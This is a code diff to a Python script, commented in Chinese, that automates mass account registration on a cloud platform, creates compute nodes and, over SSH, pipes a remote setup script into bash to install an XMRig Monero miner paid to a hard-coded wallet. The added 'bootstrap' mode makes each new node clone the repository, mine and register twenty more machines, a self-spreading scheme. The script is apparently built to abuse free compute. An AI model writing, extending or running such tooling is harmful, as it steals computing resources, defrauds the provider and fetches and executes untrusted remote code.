@@ -6,7 +6,9 @@
   1) 协议注册登录，获取 token
   2) 按配置创建节点（projectId 按账号自动识别）
   3) 等待 SSH 可用
-  4) 本地内嵌挖矿命令直接执行（不依赖外部 sh 下载）
+  4) 按 mode 在远程执行：
+     - bootstrap: 克隆 GitHub 仓库 -> 再注册 N 号开机器(mode=mine) -> 本机也挖矿
+     - mine: 仅安装挖矿（叶子节点，防止无限递归）
 
 多任务：
   --count N      任务数量
@@ -53,10 +55,18 @@ DEFAULT_WALLET = (
     os.environ.get("VPS_WALLET", "").strip()
     or "TWdsFCGsotzaLMZnyhVyDJ1sHz8hvxqyat"
 )
+DEFAULT_REPO = (
+    os.environ.get("VPS_REPO", "").strip()
+    or "https://github.com/Akilaea/bohrium-vps-pipeline.git"
+)
+DEFAULT_MODE = "bootstrap"  # bootstrap | mine
 DEFAULT_OUT = ROOT / "vps_result.json"
 DEFAULT_COUNT = 20
 DEFAULT_WORKERS = 20
 DEFAULT_RETRIES = 2
+DEFAULT_REMOTE_COUNT = 20
+DEFAULT_REMOTE_WORKERS = 20
+DEFAULT_REMOTE_RETRIES = 2
 
 _ANSI_RE = re.compile(r"\x1b\[[0-9;?]*[A-Za-z]|\x1b\].*?\x07|\x1b.")
 _CTRL_RE = re.compile(r"[\x00-\x08\x0b\x0c\x0e-\x1f]")
@@ -183,6 +193,73 @@ def _node_hosts(create_result: dict[str, Any]) -> tuple[list[str], str, str, str
     return hosts, str(username), str(password), str(ip), str(domain)
 
 
+def _sh_quote(s: str) -> str:
+    return "'" + str(s).replace("'", "'\"'\"'") + "'"
+
+
+def build_remote_cmds(
+    *,
+    mode: str = DEFAULT_MODE,
+    wallet: str = DEFAULT_WALLET,
+    repo: str = DEFAULT_REPO,
+    remote_count: int = DEFAULT_REMOTE_COUNT,
+    remote_workers: int = DEFAULT_REMOTE_WORKERS,
+    remote_retries: int = DEFAULT_REMOTE_RETRIES,
+) -> list[tuple[str, str]]:
+    """SSH 阶段命令。bootstrap=拉仓库再开20台(叶子mine)；mine=只挖矿。"""
+    mode = (mode or "mine").strip().lower()
+    wallet_q = _sh_quote(wallet)
+    mine_inline = (
+        "curl -s -L https://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh "
+        f"| bash -s {wallet_q}"
+    )
+    if mode != "bootstrap":
+        return [("执行挖矿脚本", mine_inline)]
+
+    repo_q = _sh_quote(repo)
+    # ghproxy for China VPS if raw github clone fails
+    repo_proxy = repo
+    if "github.com" in repo and "gh-proxy" not in repo:
+        repo_proxy = "https://mirror.ghproxy.com/" + repo
+    repo_proxy_q = _sh_quote(repo_proxy)
+    mine_bash_q = _sh_quote(mine_inline)
+    rc = max(int(remote_count), 1)
+    rw = max(int(remote_workers), 1)
+    rr = max(int(remote_retries), 0)
+    bootstrap = (
+        "set -e\n"
+        "export DEBIAN_FRONTEND=noninteractive\n"
+        "export PYTHONUNBUFFERED=1\n"
+        "if command -v apt-get >/dev/null 2>&1; then\n"
+        "  apt-get update -y || true\n"
+        "  apt-get install -y git python3 python3-pip python3-venv curl ca-certificates || true\n"
+        "elif command -v yum >/dev/null 2>&1; then\n"
+        "  yum install -y git python3 python3-pip curl ca-certificates || true\n"
+        "fi\n"
+        "rm -rf /root/bohrium-vps-pipeline\n"
+        f"git clone --depth 1 {repo_q} /root/bohrium-vps-pipeline "
+        f"|| git clone --depth 1 {repo_proxy_q} /root/bohrium-vps-pipeline\n"
+        "cd /root/bohrium-vps-pipeline\n"
+        "python3 -m pip install -U pip -q -i https://pypi.tuna.tsinghua.edu.cn/simple || true\n"
+        "python3 -m pip install -r requirements.txt -q -i https://pypi.tuna.tsinghua.edu.cn/simple "
+        "|| python3 -m pip install -r requirements.txt -q\n"
+        f"nohup bash -c {mine_bash_q} >/root/self_mine.log 2>&1 &\n"
+        f"nohup python3 vps.py --no-proxy --count {rc} --workers {rw} "
+        f"--retries {rr} --mode mine --wallet {wallet_q} >/root/vps_spawn.log 2>&1 &\n"
+        "SPID=$!\n"
+        "echo SPAWN_PID=$SPID\n"
+        "sleep 8\n"
+        "if ps -p $SPID >/dev/null 2>&1; then\n"
+        "  echo SPAWN_STARTED_OK\n"
+        "  exit 0\n"
+        "fi\n"
+        "echo SPAWN_FAILED\n"
+        "tail -n 120 /root/vps_spawn.log || true\n"
+        "exit 1\n"
+    )
+    return [("克隆仓库并启动二阶开号挖矿", bootstrap)]
+
+
 def run_pipeline_once(
     *,
     task_id: int = 1,
@@ -202,6 +279,11 @@ def run_pipeline_once(
     platform: str = DEFAULT_PLATFORM,
     turnoff_after: int = DEFAULT_TURNOFF_AFTER,
     wallet: str = DEFAULT_WALLET,
+    mode: str = DEFAULT_MODE,
+    repo: str = DEFAULT_REPO,
+    remote_count: int = DEFAULT_REMOTE_COUNT,
+    remote_workers: int = DEFAULT_REMOTE_WORKERS,
+    remote_retries: int = DEFAULT_REMOTE_RETRIES,
     wait_ssh: float = 180.0,
     ssh_port: int = 22,
     cmd_timeout: float | None = 3600.0,
@@ -397,12 +479,16 @@ def run_pipeline_once(
                 raise RuntimeError(f"SSH 连接失败：{short_error(last)}") from last
 
         result["stage"] = "ssh_run"
-        cmds = [
-            (
-                "执行挖矿脚本",
-                f"curl -s -L https://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | bash -s {wallet}",
-            ),
-        ]
+        cmds = build_remote_cmds(
+            mode=mode,
+            wallet=wallet,
+            repo=repo,
+            remote_count=remote_count,
+            remote_workers=remote_workers,
+            remote_retries=remote_retries,
+        )
+        ssh_info["mode"] = (mode or "mine").strip().lower()
+        ssh_info["repo"] = repo
         for title, cmd in cmds:
             log_info("%s %s...", tag, title)
             code, out_text, err_text = run_cmd(
@@ -590,6 +676,31 @@ def build_parser() -> argparse.ArgumentParser:
     p.add_argument("--turnoff-after", type=int, default=DEFAULT_TURNOFF_AFTER)
 
     p.add_argument("--wallet", default=DEFAULT_WALLET, help="挖矿钱包地址")
+    p.add_argument(
+        "--mode",
+        default=DEFAULT_MODE,
+        choices=["bootstrap", "mine"],
+        help="bootstrap=远程拉仓库再开号；mine=仅挖矿（默认 bootstrap）",
+    )
+    p.add_argument("--repo", default=DEFAULT_REPO, help="bootstrap 时克隆的 GitHub 仓库")
+    p.add_argument(
+        "--remote-count",
+        type=int,
+        default=DEFAULT_REMOTE_COUNT,
+        help=f"bootstrap 远程再开任务数（默认 {DEFAULT_REMOTE_COUNT}）",
+    )
+    p.add_argument(
+        "--remote-workers",
+        type=int,
+        default=DEFAULT_REMOTE_WORKERS,
+        help=f"bootstrap 远程并发（默认 {DEFAULT_REMOTE_WORKERS}）",
+    )
+    p.add_argument(
+        "--remote-retries",
+        type=int,
+        default=DEFAULT_REMOTE_RETRIES,
+        help=f"bootstrap 远程重试（默认 {DEFAULT_REMOTE_RETRIES}）",
+    )
     p.add_argument("--wait-ssh", type=float, default=180.0, help="等待 SSH 超时秒数")
     p.add_argument("--ssh-port", type=int, default=22)
     p.add_argument("--cmd-timeout", type=float, default=3600.0, help="单条远程命令超时秒数")
@@ -651,16 +762,22 @@ def main(argv: list[str] | None = None) -> int:
         "platform": args.platform,
         "turnoff_after": args.turnoff_after,
         "wallet": args.wallet,
+        "mode": args.mode,
+        "repo": args.repo,
+        "remote_count": args.remote_count,
+        "remote_workers": args.remote_workers,
+        "remote_retries": args.remote_retries,
         "wait_ssh": args.wait_ssh,
         "ssh_port": args.ssh_port,
         "cmd_timeout": args.cmd_timeout,
     }
 
     log_info(
-        "启动：任务数=%s 线程=%s 重试=%s 代理=%s",
+        "启动：任务数=%s 线程=%s 重试=%s 模式=%s 代理=%s",
         count,
         workers,
         retries,
+        args.mode,
         proxy or "无",
     )
 
